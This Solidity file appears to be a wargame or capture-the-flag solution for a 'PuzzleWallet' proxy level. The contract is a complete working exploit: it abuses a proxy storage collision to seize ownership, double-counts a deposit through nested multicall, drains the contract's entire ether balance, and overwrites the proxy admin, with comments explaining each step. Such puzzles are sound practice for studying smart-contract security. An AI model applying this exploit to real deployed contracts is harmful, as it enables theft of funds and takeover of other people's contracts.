// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuzzleProxy.sol";
// import "hardhat/console.sol";

contract PuzzleProxyHack {
    PuzzleWallet puzzleWallet;
    PuzzleProxy puzzleProxy;

    constructor (address payable _puzzleProxyAddress) {
        puzzleWallet = PuzzleWallet(_puzzleProxyAddress);
        puzzleProxy = PuzzleProxy(_puzzleProxyAddress);
        _exploit();
    }

    function _exploit() internal {
        puzzleProxy.proposeNewAdmin(msg.sender);

        // Now that we are the owner, add ourself to the whitelisted user list
        // to be able to deposit, execute and multicall
        puzzleWallet.addToWhitelist(msg.sender);

        bytes[] memory callsDeep = new bytes[](1);
        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
        puzzleWallet.multicall{value: 0.001 ether}(calls);

        // At this point inside the contract there are 0.002 ether (one is from us and one from the PuzzleWalletFactory)
        // But `balances[player]` is equal to 0.002 ether!
        // We are able to call the `execute` method in a way that will send to us the whole contract's balance
        puzzleWallet.execute(msg.sender, 0.002 ether, "");

        // Become the admin of the `PuzzleProxy`
        puzzleWallet.setMaxBalance(uint160(msg.sender));
        
        // console.log("New Admin is : ", puzzleProxy.admin());
    }
}